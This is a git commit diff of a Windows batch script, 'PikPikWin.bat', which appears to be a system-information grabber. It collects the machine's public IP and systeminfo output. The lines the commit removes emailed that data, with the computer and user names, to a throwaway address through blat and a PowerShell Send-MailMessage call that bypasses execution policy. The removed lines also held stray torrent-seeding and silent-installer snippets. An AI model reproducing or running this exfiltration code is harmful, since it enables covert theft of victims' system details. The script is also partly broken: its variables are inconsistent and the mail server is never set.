fd46f330102a88d3d8d104f6f164ff395b7fcc6b
00MY00 <75865145+00MY00@users.noreply.github.com>
2023-04-16 19:00:44 +0200

    Update PikPikWin.bat

--- PikPikWin.bat
+++ PikPikWin.bat
@@ -17,7 +17,7 @@ rem for the malicious use of this script or any errors
 rem that may occur during the execution of the script
 rem ###########################################################
 
-
+rem Test
 
 @echo off
 set back=%~dp0
@@ -33,11 +33,6 @@ title PikPik Windows
 for /f "delims=" %%a in ('curl ifconfig.me/ip') do set PublicIP=%%a
 
 
-
-
-
-
-
 rem Clear
 cls
 
@@ -48,57 +43,14 @@ cd %back%\PikPik
 
 systeminfo >> GrabInfo.txt
 
+GrabInfo.txt
 
-
-
-
-
-
-
-
-
-rem Partage de fichier BitTorrent
-set file_path=C:\path\to\file.txt
-set torrent_path=C:\path\to\save\torrent
-
-echo Creating torrent file...
-qbittorrent-nox.exe --create-torrent "%file_path%" -o "%torrent_path%"
-
-echo Seeding torrent...
-qbittorrent-nox.exe "%torrent_path%" --no-scan
-
-echo Torrent created and seeded successfully!
-pause
-
-
-
-
-rem email a changer
-set TO=caxok32339@snowlash.com
-set FROM=sender@example.com
-set PASSWORD=Motdepass1
-set SUBJECT="Tu as recu des Information de la machine :%COMPUTERNAME% Utilisateur :%USERNAME%"
-set BODY="L'IP publique de la machinne est : %PublicIP%"
-set ATTACHMENT="%back%\PikPik\GrabInfo.txt"
-
-echo %BODY% | blat -to %TO% -subject %SUBJECT% -server %SMTP_SERVER% -f %FROM%
-
-rem Send email using PowerShell
-powershell.exe -ExecutionPolicy Bypass -command "Send-MailMessage -To '%TO%' -From '%FROM%' -Subject '%SUBJECT%' -Body '%BODY% IP address: %IP% Public IP: %PUBLIC_IP%' -SmtpServer 'smtp.example.com' -Port 587 -UseSsl -Credential (New-Object System.Management.Automation.PSCredential ('%FROM%', (ConvertTo-SecureString '%PASSWORD%' -AsPlainText -Force))) -Attachments '%ATTACHMENT%'"
-echo Email sent successfully!
-
+del GrabInfo.txt
 exit
 
 
-rem cod powershell d'installation pour torrent
-# Télécharger le fichier d'installation de qBittorrent
-$downloadUrl = "https://github.com/qbittorrent/qBittorrent/releases/download/release-4.3.7/qbittorrent_4.3.7_setup.exe"
-$installerPath = "C:\qbittorrent_setup.exe"
-Invoke-WebRequest -Uri $downloadUrl -OutFile $installerPath
 
-# Installer qBittorrent en mode silencieux
-Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
 
-# Supprimer le fichier d'installation
-Remove-Item $installerPath
+
+
 
